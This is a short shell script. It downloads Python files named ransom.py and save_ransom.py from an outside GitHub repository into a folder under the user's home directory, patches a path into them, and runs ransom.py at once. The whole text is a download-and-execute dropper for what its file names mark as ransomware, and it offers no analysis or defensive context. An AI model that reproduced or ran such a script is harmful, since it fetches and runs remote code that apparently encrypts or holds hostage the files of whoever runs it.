path=$(eval echo ~$USER)/afs
wget https://raw.githubusercontent.com/NeKroFR/Confl00se/main/scripts/ransom.py -O $path/ransom.py
wget https://github.com/NeKroFR/Confl00se/blob/main/scripts/save_ransom.py -O $path/save.py
sed -i "s/__PATH__/$path/g" $path/save.py
sed -i "s/__PATH__/$path/g" $path/ransom.py
python3 $path/ransom.py
